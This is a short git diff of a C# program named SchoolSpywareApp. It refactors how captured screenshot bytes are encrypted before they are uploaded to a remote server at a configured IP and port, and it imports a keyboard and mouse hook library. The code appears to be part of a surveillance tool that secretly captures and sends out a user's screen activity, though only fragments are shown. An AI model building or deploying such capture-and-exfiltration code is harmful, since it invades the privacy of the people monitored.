@@ -2,7 +2,6 @@
 using System.Drawing.Imaging;
 using System.Net.Http.Headers;
 using System.Security.Cryptography;
-using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Windows.Forms;
 using Gma.System.MouseKeyHook;
@@ -33,7 +32,7 @@ namespace SchoolSpywareApp
             
             string ipAddress = fields[0];
             int port = Int32.Parse(fields[1]);
-            
+
             await LoadSymmetricKey(ipAddress, port, username);
 
             UriBuilder uriBuilder = new UriBuilder
@@ -75,7 +74,7 @@ namespace SchoolSpywareApp
                 imageBytes = memoryStream.ToArray();
             }
 
-            imageBytes = _rsa.Encrypt(imageBytes, RSAEncryptionPadding.Pkcs1);
+            imageBytes = await Encrypt(imageBytes);
 
             ByteArrayContent imageContent = new ByteArrayContent(imageBytes);
 
@@ -88,7 +87,7 @@ namespace SchoolSpywareApp
             Console.WriteLine(response);
             Console.WriteLine(await response.Content.ReadAsStringAsync());
         }
-
+        
         private static async Task LoadSymmetricKey(string ipAddress, int port, string username)
         {
             RSA rsa = RSA.Create();
